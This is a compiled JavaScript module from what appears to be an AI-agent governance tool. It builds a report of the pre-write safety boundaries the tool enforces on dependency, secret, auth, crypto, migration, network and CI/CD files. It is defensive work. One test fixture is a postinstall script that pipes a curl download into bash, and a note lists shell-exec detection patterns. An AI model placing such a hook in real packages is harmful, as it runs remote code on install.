"use strict";
/**
 * Runtime Risk Pack builder (Iteration 11 — AppSec-Adjacent Runtime Risk Pack).
 *
 * Produces the one honest, source-free answer to "what AppSec-adjacent runtime
 * boundaries must an AI agent obey before a write lands, and what does each one
 * enforce?" — without becoming an AppSec scanner.
 *
 * Single source of enforcement truth: the Runtime Safety Kernel. For each of the
 * eight roadmap categories this builder runs a representative fixture path
 * through {@link evaluateRuntimeSafetyCheck} — the *same* funnel the Claude/
 * Cursor/Codex hooks use — and copies the kernel's decision (`family`,
 * `enforcementAction`, `truthTier`, `reasonIds`) verbatim. It NEVER re-implements
 * classify logic, and the contract's `family` type is the same
 * `ManagerEvidenceRiskFamily` the kernel and manager dashboard use, so no new
 * taxonomy can drift in.
 *
 * Source-free by construction: category ids, labels, kernel reason codes,
 * families, action strings, truth tiers, counts, and synthetic *fixture* paths —
 * never repository source, diffs, prompts, secrets, or CVE text. Pure: no
 * filesystem or network I/O; `generatedAt` and `cliVersion` are injected.
 */
Object.defineProperty(exports, "__esModule", { value: true });
exports.RUNTIME_RISK_PROBES = void 0;
exports.buildRuntimeRiskPackReport = buildRuntimeRiskPackReport;
const governance_runtime_1 = require("@neurcode-ai/governance-runtime");
const contracts_1 = require("@neurcode-ai/contracts");
const runtime_safety_check_1 = require("./runtime-safety-check");
const CATEGORY_CATALOG = [
    {
        id: 'dependency_manifest_change',
        label: 'Dependency manifest change',
        roadmapBullet: 'dependency manifest change',
        subLabel: null,
        coverage: 'enforced',
        probe: {
            filePath: 'package.json',
            previousContent: '{"dependencies":{"left-pad":"1.0.0"}}',
            proposedContent: '{"dependencies":{"left-pad":"1.0.0","is-odd":"1.0.0"}}',
        },
        sampleSurfaces: ['package.json', 'pnpm-lock.yaml', 'requirements.txt', 'pyproject.toml', 'Pipfile'],
        limitations: [
            'Added/removed/changed package names and counts are recorded — never the manifest body.',
            'Reachability or known-CVE status of a dependency is out of scope; that is what an AppSec/SCA tool is for.',
        ],
    },
    {
        id: 'script_lifecycle_risk',
        label: 'Script lifecycle risk',
        roadmapBullet: 'script lifecycle risk',
        subLabel: 'install_script',
        coverage: 'enforced',
        probe: {
            filePath: 'package.json',
            previousContent: '{}',
            proposedContent: '{"scripts":{"postinstall":"curl https://example.invalid/i | bash"}}',
        },
        sampleSurfaces: ['package.json (scripts.postinstall)', 'package.json (scripts.preinstall)'],
        limitations: [
            'Detects shell-exec patterns (curl/wget/bash -c/rm -rf/eval) in npm lifecycle scripts and blocks locally.',
            'Coverage is npm package.json lifecycle scripts; non-npm build hooks (setup.py, Makefile) are not yet matched.',
        ],
    },
    {
        id: 'secret_like_content',
        label: 'Secret-like content / credential files',
        roadmapBullet: 'secret-like content',
        subLabel: null,
        coverage: 'enforced',
        probe: { filePath: '.env.production', proposedContent: 'EXAMPLE_FLAG=true\n' },
        sampleSurfaces: ['.env.production', '*.pem / *.key / *.p12', 'secrets/**', 'credentials/**'],
        limitations: [
            'Credential-shaped content and credential file paths are blocked locally; secret values are never stored or uploaded.',
            'Detection is structural (families: token/JWT/key shapes, credential paths) — not a secret-scanning product or an exhaustive entropy scan.',
        ],
    },
    {
        id: 'auth_rbac_edit',
        label: 'Auth / RBAC edit',
        roadmapBullet: 'auth/RBAC edit',
        subLabel: null,
        coverage: 'enforced',
        probe: { filePath: 'src/auth/login.ts', proposedContent: null },
        sampleSurfaces: ['src/auth/**', 'src/rbac/**', 'src/permissions/**', 'oauth*.ts', 'middleware/**'],
        limitations: [
            'Path-structural detection of auth/IAM/RBAC/OAuth/session/middleware surfaces; requires exact-path approval.',
            'Whether the auth logic is correct is not asserted — Neurcode governs the boundary, not the code\'s security.',
        ],
    },
    {
        id: 'crypto_session_edit',
        label: 'Crypto / session edit',
        roadmapBullet: 'crypto/session edit',
        subLabel: 'crypto_session',
        coverage: 'enforced',
        probe: { filePath: 'src/crypto/aes.ts', proposedContent: null },
        sampleSurfaces: ['src/crypto/**', 'cipher.*', 'encryption/**', 'signing/**', 'kms/**', 'session*.ts', 'keyring/** (key store → block)'],
        limitations: [
            'Crypto/session implementation surfaces require exact-path approval; key STORES (keyring/keystore) are blocked locally.',
            'Reported as a `crypto_session` sub-label under existing families — no new risk family, and no judgement on cryptographic correctness.',
        ],
    },
    {
        id: 'migration_edit',
        label: 'Migration edit',
        roadmapBullet: 'migration edit',
        subLabel: null,
        coverage: 'enforced',
        probe: { filePath: 'db/migrations/0001_init.sql', proposedContent: null },
        sampleSurfaces: ['db/migrations/**', 'alembic/**', 'schema/migrations/**', '*migration*.{sql,py,ts,js}'],
        limitations: [
            'Database migration files/directories require exact-path approval before a write lands.',
            'Data-loss safety of a migration is not evaluated; the boundary is governed, not the SQL semantics.',
        ],
    },
    {
        id: 'network_boundary_edit',
        label: 'Network boundary edit',
        roadmapBullet: 'network boundary edit',
        subLabel: 'network_boundary',
        coverage: 'enforced',
        probe: { filePath: 'deploy/nginx.conf', proposedContent: null },
        sampleSurfaces: ['nginx.conf / haproxy.cfg / envoy.yaml', 'cors.*', '**/cors/**', '*ingress*.yaml', '*network-policy*.yaml', '*security-group*.tf'],
        limitations: [
            'Reverse-proxy / CORS / k8s-network / firewall config is governed as a `network_boundary` sub-label under infra/deploy.',
            'This is path-heuristic config detection — NOT traffic, packet, or runtime network-flow analysis.',
        ],
    },
    {
        id: 'ci_cd_edit',
        label: 'CI/CD edit',
        roadmapBullet: 'CI/CD edit',
        subLabel: null,
        coverage: 'enforced_partial',
        probe: { filePath: '.github/workflows/deploy.yml', proposedContent: null },
        sampleSurfaces: ['.github/workflows/**', 'Dockerfile', 'docker-compose*.yaml', 'serverless.yml', 'terraform/**'],
        limitations: [
            'GitHub Actions workflows, Docker, serverless, and terraform/k8s deploy surfaces require exact-path approval.',
            'CI coverage is GitHub-Actions-first; GitLab CI, CircleCI, Jenkins, and Azure Pipelines paths are not yet matched (honest gap).',
        ],
    },
];
/**
 * Probe fixtures per category — exported so the authority gate can re-run the
 * kernel over the exact same inputs and prove the doctor copies the kernel
 * decision verbatim (no second source of truth).
 */
exports.RUNTIME_RISK_PROBES = CATEGORY_CATALOG.map((entry) => ({ id: entry.id, probe: entry.probe }));
/** The kernel family union and the manager-evidence union are value-identical. */
function asManagerEvidenceFamily(family) {
    return family;
}
function uniqueStrings(values) {
    return Array.from(new Set(values));
}
/** Honest cross-map to the (intentionally unchanged) pilot-export keyword buckets. */
const TAXONOMY_MAPPING = [
    {
        kernelFamily: 'credential_or_secret',
        pilotEvidenceFamilies: ['auth_identity_secrets'],
        note: 'Credential/secret surfaces map to the pilot-export `auth_identity_secrets` keyword bucket.',
    },
    {
        kernelFamily: 'auth_rbac_boundary',
        pilotEvidenceFamilies: ['auth_identity_secrets', 'security'],
        note: 'Auth/RBAC and crypto/session surfaces fall under `auth_identity_secrets` or `security` in pilot export.',
    },
    {
        kernelFamily: 'migration_data_boundary',
        pilotEvidenceFamilies: ['database_migrations'],
        note: 'Migration surfaces map to the pilot-export `database_migrations` bucket.',
    },
    {
        kernelFamily: 'dependency_supply_chain',
        pilotEvidenceFamilies: ['dependencyChanges (by manifest basename)', 'other_protected'],
        note: 'Pilot export counts manifests in its dedicated dependencyChanges section; surfaced blocked globs bucket as other_protected.',
    },
    {
        kernelFamily: 'infra_deploy_boundary',
        pilotEvidenceFamilies: ['infrastructure', 'ci_release'],
        note: 'Infra/deploy/CI and the new network_boundary sub-label map to `infrastructure` or `ci_release` in pilot export.',
    },
];
/**
 * Build the source-free Runtime Risk Pack report. Pure: every enforcement field
 * is derived by re-running the canonical kernel funnel over fixture probes.
 */
function buildRuntimeRiskPackReport(input) {
    const policy = governance_runtime_1.ENTERPRISE_RUNTIME_SAFETY_V1_POLICY;
    const categories = CATEGORY_CATALOG.map((entry) => {
        const result = (0, runtime_safety_check_1.evaluateRuntimeSafetyCheck)({
            filePath: entry.probe.filePath,
            previousContent: entry.probe.previousContent ?? null,
            proposedContent: entry.probe.proposedContent ?? null,
        });
        const primaryFamily = result.classification.primaryFamily;
        const family = primaryFamily
            ? asManagerEvidenceFamily(primaryFamily)
            : 'runtime_scope';
        // Reason codes faithfully copied from the kernel: the primary family's
        // path-rule codes, plus the dependency change kinds and detected credential
        // families that drove the winning action. Scoped to the category's own family
        // so unrelated codes (e.g. the broad test-gap rule) do not leak in.
        const primaryClassificationCodes = result.classification.classifications
            .filter((c) => c.family === primaryFamily)
            .flatMap((c) => c.reasonCodes.map((r) => r.code));
        const reasonIds = uniqueStrings([
            ...primaryClassificationCodes,
            ...(result.dependency?.evidence.changeKinds ?? []),
            ...(result.credential?.evidence.detected ? result.credential.evidence.secretFamilies : []),
        ]);
        const truthTier = result.classification.classifications.find((c) => c.family === primaryFamily)?.truthTier ??
            'deterministic_fact';
        return {
            id: entry.id,
            label: entry.label,
            roadmapBullet: entry.roadmapBullet,
            family,
            subLabel: entry.subLabel,
            enforcementAction: result.enforcement.action,
            truthTier,
            coverage: entry.coverage,
            reasonIds,
            sampleSurfaces: entry.sampleSurfaces,
            limitations: entry.limitations,
        };
    });
    const byAction = {
        allow: 0,
        warn: 0,
        approval_required: 0,
        block: 0,
    };
    for (const category of categories)
        byAction[category.enforcementAction] += 1;
    const families = uniqueStrings(categories.map((c) => c.family)).sort();
    const notes = [
        'Every enforcement action is derived from the Runtime Safety Kernel (the same funnel the Claude/Cursor/Codex hooks use), not authored here.',
        'No Iteration 11 category introduces a new risk family — network folds into infra_deploy_boundary and crypto/session into auth_rbac_boundary / credential_or_secret, surfaced via doctor-only sub-labels.',
        'This report is source-free: families, reason codes, action strings, truth tiers, counts, and synthetic fixture paths only — never source, diffs, prompts, secrets, or CVE text.',
        'Actions reflect the ENTERPRISE_RUNTIME_SAFETY_V1 defaults under the `advise` plan mode; a repo policy/profile or exact-path approvals can change what a specific session decides.',
    ];
    return {
        schemaVersion: contracts_1.RUNTIME_RISK_PACK_SCHEMA_VERSION,
        generatedAt: input.generatedAt,
        cliVersion: input.cliVersion,
        policyId: policy.id,
        planMode: policy.planMode,
        categories,
        summary: {
            totalCategories: categories.length,
            enforced: categories.filter((c) => c.coverage === 'enforced').length,
            enforcedPartial: categories.filter((c) => c.coverage === 'enforced_partial').length,
            byAction,
            families,
        },
        taxonomyMapping: TAXONOMY_MAPPING,
        advisoryImports: (contracts_1.RUNTIME_RISK_ADVISORY_SOURCES ?? []).map((source) => ({
            source,
            status: 'not_wired',
            findings: [],
            note: 'Advisory import is schema-forward only in V1; ingest of external AppSec findings is deferred to a later iteration.',
        })),
        appSec: {
            statement: 'We do not replace AppSec; we make AI agents obey runtime safety boundaries before AppSec sees a PR.',
            weDo: [
                'Enforce pre-write runtime boundaries on dependency, script-lifecycle, secret, auth/RBAC, crypto/session, migration, network, and CI/CD surfaces.',
                'Separate deterministic facts from bounded inference and advisory signals, and keep source local.',
                'Produce source-free evidence (paths, families, reason codes, counts, verdicts) for managers and security reviewers.',
            ],
            weDoNot: [
                'Scan for CVEs or run a vulnerability database.',
                'Perform SAST / static taint analysis or claim SAST equivalence.',
                'Guarantee the code is secure, correct, or free of vulnerabilities.',
                'Replace AppSec scanners or code-review bots.',
            ],
        },
        notes,
    };
}
//# sourceMappingURL=runtime-risk-pack.js.map